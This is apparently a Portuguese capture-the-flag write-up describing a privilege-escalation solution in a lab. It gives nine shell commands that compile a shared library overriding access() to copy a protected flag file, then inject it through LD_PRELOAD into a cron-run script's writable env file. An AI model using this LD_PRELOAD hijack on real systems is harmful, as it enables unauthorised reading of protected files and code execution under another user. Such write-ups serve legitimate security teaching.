No diretorio /home/flag_reader deparamo-nos com alguns ficheiros relevantes para a resolução do problema. 

my_script.sh:
![img1](https://cdn.discordapp.com/attachments/1153998326274994216/1161367814062477403/image.png?ex=65380b10&is=65259610&hm=b6893a1c9c1f34c6815226817a94eebb03ec3520069ed24f469258c3c00bde8b&)

main.c:
![Alt text](https://cdn.discordapp.com/attachments/1153998326274994216/1161368243156557915/image.png?ex=65380b76&is=65259676&hm=b63ca5a9b761269fa57b1fecf2c88f63890a22e4154926f6caf8dc6bea96002c&)


Neste diretório podemos tambem verificar que o ficheiro env pode ser alterado a partir de outro diretório tmp. Diretório no qual temos permissões de leitura, escrita e execução. Deste modo, pretendemos explorar a vulnerabilidade a partir daí.      
Ficheiros que estão na pasta flag_reader: 
![Alt text](https://cdn.discordapp.com/attachments/1153998326274994216/1161368330372915210/image.png?ex=65380b8b&is=6525968b&hm=55a65ef4e8a38266460f79050f28e1389678558e368f4687ded7519a7edbcc4c&)
![Alt text](https://cdn.discordapp.com/attachments/1153998326274994216/1161368405178331246/image.png?ex=65380b9c&is=6525969c&hm=9308648dab331bf32b5ef4f2b7172a68c7a245c29d57e621a53f4ba2f594cc0a&)

No diretório do tmp verificamos que existe um ficheiro env. Neste preciso momento em que descobrimos o ficheiro env, demos conta que a partir de uma biblioteca partilhada entre os diretórios seria possível fazer overload da função access() localizada em main.c, usando o commando system, para passarmos as variáveis de ambiente que editarmos na pasta tmp, e obtermos a flag escrita para um ficheiro(myfile.txt) num diretorio em que teriamos total controlo sobre o mesmo(tmp).

Para descobrirmos a flag procedemos aos seguintes comandos: 

1) touch printenv.c 
2) echo "#include <stdio.h>" >> printenv.c
3) echo "int access(const char *pathname, int mode) { " >> printenv.c
4) echo "system(\"/usr/bin/cat /flags/flag.txt > /tmp/myfile.txt\");" >> printenv.c
5) echo "return 0;" >> printenv.c
6) echo " } " >> printenv.c
7) gcc -fPIC -g -c printenv.c
8) gcc -shared -o libmylib.so.1.0.1 printenv.o -lc
9) echo "LD_PRELOAD=/tmp/libmylib.so.1.0.1" >> env

Neste momento, após a execução destes 9 passos, apenas temos que esperar que o script corra de forma automática.   
Script em questão:
![img](https://cdn.discordapp.com/attachments/1153998326274994216/1161368492650537071/image.png?ex=65380bb1&is=652596b1&hm=ef14e614d7cb66faada936304f3fbafae324d020b4899e2d19342d13107f1c85&)
De acordo com a foto podemos verificar que o script corre de 1 em 1 minutos aos 00 segundos. 

Depois de esperarmos que o script ocorra:
![img](https://cdn.discordapp.com/attachments/1153998326274994216/1161369119707365446/image.png?ex=65380c47&is=65259747&hm=f58f5764324595636f75a47aba2ddd6498697e37f9c3dbfa63442fe7f5c426db&)
